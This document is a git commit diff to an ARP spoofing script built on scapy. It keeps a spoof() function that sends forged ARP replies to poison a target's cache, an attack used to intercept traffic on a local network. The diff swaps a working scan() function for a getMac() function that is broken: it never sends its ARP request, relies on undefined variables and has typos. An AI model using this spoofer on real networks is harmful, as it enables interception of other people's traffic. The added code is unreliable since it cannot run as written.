687938074ea6d2af77f61252106c28ce47269950
Viktor <swifrorlilko@gmail.com>
2020-02-01 20:49:47 +0200

    adding mac adress detect

--- net-spoof/spoofer.py
+++ net-spoof/spoofer.py
@@ -1,15 +1,18 @@
 import scapy.all as scapy
 
+def getMac(ip):
+    arpRequest = scapy.ARP(pdst=ip)
+    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arpRequestBroadcast = broadcast/arpRequest
+
+    answeredList[0][1].hwsrc
+    clientsList = []
+    for el in answeredList:
+        client_dict = {"ip": el[1].psrc, "mac": el[1].hwsrc}
+        clientsList.append(client_disct)
+    return client_list
+
 def spoof(targetIp, spoofIp):
     packet = scapy.ARP(op=2, pdst=targetIp, hwdst="00:23:d1:d0:cd:21", psrc=spoofIp)
     scapy.send(packet)
 
-def scan(ip):
-    arpRequest = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arpRequestBroadcast = broadcast/arpRequest
-    answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
-
-    print("IP\t\t\tMAC Address\t\t\tVendor\n-----------------------------------------------------------")
-    for el in answered:
-        print(el[1].psrc + "\t\t" + el[1].hwsrc + "\t\t" + MacLookup().lookup(el[1].hwsrc))
